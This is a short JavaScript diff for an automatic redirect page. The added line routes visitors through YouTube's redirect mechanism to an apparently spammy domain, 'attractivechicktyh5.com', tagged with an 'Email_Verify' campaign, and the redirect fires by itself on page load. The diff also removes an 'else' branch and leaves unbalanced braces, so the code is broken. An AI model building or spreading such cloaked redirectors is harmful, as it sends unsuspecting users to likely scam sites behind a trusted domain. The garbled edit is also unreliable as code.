@@ -1,4 +1,4 @@
-var app = "vnd.youtube://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbUh3QVNLZU12UUJldTdQb2Y5RlNwN2EwVmlJZ3xBQ3Jtc0tuRmsxQzJzOGdXcmgwbklCUHA4Z3BLS0hyck03cVhnMlBoT19QdDdraTFlQ21oTzRxOUwtTWpHT2NKQXoxU29zQnE0Rk5sY1ltcksxYlBhNXhSMkxPNTdRU1RWMkhOaGRaZ3lSaF9jV3FSNWpTMHdKWQ&q=https%3A%2F%2Ft.co%2FKDmsAcAL3v&html_redirect=1";
+var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbjIxSTd0LXNQd3lrTGZIMzdTLTM0S1lNa2pWd3xBQ3Jtc0tsTVU4Mmo0d1BlNHZNTnZ1bXJ4dE1ERC02NURLNHh1UERvWlo0RlpPSmdZS2pRY1VNOTFjaU1PdEVUWXc2NjRZd1hQQWxHYzZHZEVCUm1OOW05RFk5YklwbDRMZ3FWbXpVeGFQTXQ0UVlfbnRiaHc0QQ&q=https%3A%2F%2Fattractivechicktyh5.com%2F%3Futm_source%3DlE4HZjeECe15Tz%26utm_campaign%3DEmail_Verify&html_redirect=1";
 
     document.addEventListener('DOMContentLoaded', function() {
       setTimeout(function() {
@@ -8,7 +8,7 @@ var app = "vnd.youtube://www.youtube.com/redirect?event=comments&redir_token=QUF
           window.setTimeout(function() {
             window.location.href = mobileFallback;
           }, 25);
-        } else {
+   
           window.location.href = desktopFallback;
         }
 
